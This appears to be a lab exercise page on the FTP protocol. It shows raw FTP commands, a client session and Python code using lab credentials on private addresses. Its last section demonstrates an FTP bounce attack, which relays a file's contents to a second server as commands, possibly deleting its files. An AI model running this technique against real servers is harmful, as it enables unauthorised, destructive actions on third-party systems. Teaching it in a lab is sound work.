.. _ref_examples:

**********************
Functions and Examples
**********************

----------------------
FTP
----------------------
This exercise uses the File Transfer Protocol. This is an old yet still common protocol for sharing files. ::

    USER student               # authenticate
    PASS golyeeHug6

    PORT 192,168,56,1,43,232   # have the server open data connections to 192.168.56.1:11240
    LIST                       # list the files in the current directory, to the data connection
    RETR example.txt           # print the content of example.txt, to the data connection

    QUIT                       # end session

We wouldn't normally issue these commands by hand. The `ftp` command line tool acts as a more convenient wrapper around the underlying commands. We need to recieve the LIST output and file contents on port 11240, which would otherwise require hand-cranking something like `netcat`.

To do the above in `ftp`, we'd type::

    $ ftp 192.168.56.101
    Connected to 192.168.56.101.
    220 ProFTPD 1.3.5b Server (ProFTPD Default Installation) [192.168.56.101]
    Name: student
    331 Password required for student
    Password:
    230 User student logged in
    Remote system type is UNIX.
    Using binary mode to transfer files.
    ftp> dir
    229 Entering Extended Passive Mode (|||8704|)
    150 Opening ASCII mode data connection for file list
    -rw-r--r--   1 student  users          59 Aug 19 10:06 example.txt
    drwxr-xr-x   2 student  root         4096 Aug 16 15:21 export-restricted-crypto
    226 Transfer complete
    ftp> get example.txt
    local: example.txt remote: example.txt
    229 Entering Extended Passive Mode (|||52192|)
    150 Opening BINARY mode data connection for example.txt (59 bytes)
    100% |***********************************|    59      685.91 KiB/s    00:00 ETA
    226 Transfer complete
    59 bytes received in 00:00 (107.09 KiB/s)
    ftp> quit
    221 Goodbye.

There's a lot there. But you can see we use `dir` for `LIST`, `get` for `RETR` and that `ftp` handles the `PORT` command internally.

For this exercise we'll be using Python to interface with FTP::

    ftp = FTP("192.168.56.101", debug=False)
    ftp.send_login_commands("student", "golyeeHug6")
    print("")

    # Tell FTP how to send us data.
    data_address = ftp.new_data_address()
    ftp.send_port_command(data_address)
    ftp.recv_response()
    print("")

    # Get a list of files in the current directory.
    ftp.send_command("LIST")
    ftp.recv_response()
    list_of_files = ftp.recv_data()
    ftp.recv_response()
    print("")

    # Tell FTP how to send us data.
    # N.B. A new data address is required each command.
    data_address = ftp.new_data_address()
    ftp.send_port_command(data_address)
    ftp.recv_response()
    print("")

    # Retrieve the contents of a file, example.txt.
    ftp.send_command("RETR example.txt")
    ftp.recv_response()
    example_file_contents = ftp.recv_data()
    ftp.recv_response()
    print("")

    ftp.close()

We'll also be using a (now-patched) protocol feature to send data to other FTP servers! ::

    ftp = FTP("192.168.56.101", debug=True)
    ftp.send_login_commands("student", "golyeeHug6")
    print("")

    # Tell the FTP server to send data to 192.168.56.102:21.
    target_address = ("192.168.56.102", 21)
    ftp.send_port_command(target_address)
    ftp.recv_response()
    print("")

    # This will send the contents of example.txt to the FTP server on 192.168.56.102,
    # as commands to run. So if it says to delete all files, they will all be deleted.
    ftp.send_command("RETR example.txt")
    ftp.recv_response()
    ftp.recv_response()
    print("")

    ftp.close()
